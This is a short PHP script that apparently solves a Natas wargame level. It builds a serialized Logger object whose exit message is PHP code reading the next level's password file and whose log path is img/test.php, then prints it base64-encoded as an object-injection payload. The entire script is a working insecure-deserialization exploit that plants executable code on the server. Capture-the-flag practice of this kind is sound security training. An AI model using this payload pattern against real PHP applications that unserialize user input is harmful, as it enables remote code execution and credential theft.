<?php

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="";
            $this->exitMsg="<?php var_dump(file_get_contents('/etc/natas_webpass/natas27')) ?>";
            $this->logFile = "img/test.php";
      
            // write initial message
            // $fd=fopen($this->logFile,"a+");
            // fwrite($fd,$initMsg);
            // fclose($f)d;
        }                       
      
        function log($msg){
            // $fd=fopen($this->logFile,"a+");
            // fwrite($fd,$msg."\n");
            // fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            // $fd=fopen($this->logFile,"a+");
            // fwrite($fd,$this->exitMsg);
            // fclose($fd);
        }                       
    }

    var_dump(base64_encode(serialize(new Logger('a'))))
    ;